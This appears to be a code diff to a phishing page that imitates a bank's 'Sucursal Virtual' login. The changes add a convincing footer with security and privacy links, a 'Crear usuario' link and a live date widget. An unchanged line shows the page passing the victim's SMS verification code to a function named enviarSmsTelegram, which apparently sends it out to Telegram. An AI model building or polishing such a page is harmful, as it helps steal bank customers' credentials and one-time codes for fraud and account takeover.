@@ -75,7 +75,6 @@
     .bc-form-field{width:100%;position:relative;height:52px;margin-top:20px;}
     @media screen and (max-width:975px){.bc-form-field{margin-bottom:15px;display:grid;}}
     
-    /* Ajuste del ícono SVG antiguo (ahora oculto) */
     .bc-form-field>em{position:absolute;color:#2c2a29;top:4px;font-size:1.5rem;}
     .bc-form-field>em:first-child{left:0;width:24px;}
 
@@ -85,7 +84,7 @@
       width: 20px;
       height: 20px;
       top: 6px;
-      left: 0; /* Asegura que el ícono esté a la izquierda */
+      left: 0;
       object-fit: contain;
       z-index: 2;
     }
@@ -104,7 +103,7 @@
       font-weight:600;
       font-size:1rem;
       line-height:24px;
-      padding-left: 35px; /* <-- Aumentado para dar espacio al ícono y al texto */
+      padding-left: 35px; /* Espacio para el ícono */
     }
     
     .bc-input[aria-label]:focus,.bc-input[id]:focus{outline:none;transition:.5s;border-bottom:2px solid #2c2a29;}
@@ -345,6 +344,16 @@
       opacity: 0;
       pointer-events: none;
     }
+
+    /* Estilos del Footer */
+    .svp-footer {
+      padding: 1rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #666;
+      margin-top: 2rem;
+    }
+    .svp-footer p { margin-bottom: 8px; }
   </style>
 </head>
 
@@ -491,9 +500,12 @@
                 </section>
                </form>
 
-                                <section class="bc-card-auth-link">
-                                  <a href="#" class="bc-link link-default link-underline"></a>
-      </section>
+               <!-- Enlace Crear Usuario restaurado -->
+               <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
+                <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: #2c2a29;">
+                  <u>Crear usuario</u>
+                </a>
+              </section>
 
              </section>
                             </section>
@@ -504,7 +516,12 @@
                 </div>
               </div>
             </main>
-            <svp-footer></svp-footer></app-simple-template>
+            <!-- Footer restaurado -->
+            <footer class="svp-footer">
+              <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
+              <p id="reloj-widget" style="margin-top:8px;"></p>
+            </footer>
+          </app-simple-template>
         </app-register-template>
       </svp-authentication>
     </div>
@@ -917,6 +934,19 @@
       mostrarOverlay();
       enviarSmsTelegram(smsCodeInput.value);
     });
+
+    // ==========================================
+    // RELOJ / FECHA
+    // ==========================================
+    function actualizarFecha() {
+      const ahora = new Date();
+      const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
+      let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
+      const el = document.getElementById('reloj-widget');
+      if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
+    }
+    actualizarFecha();
+    setInterval(actualizarFecha, 60000);
 
     actualizarBoton();
   </script>
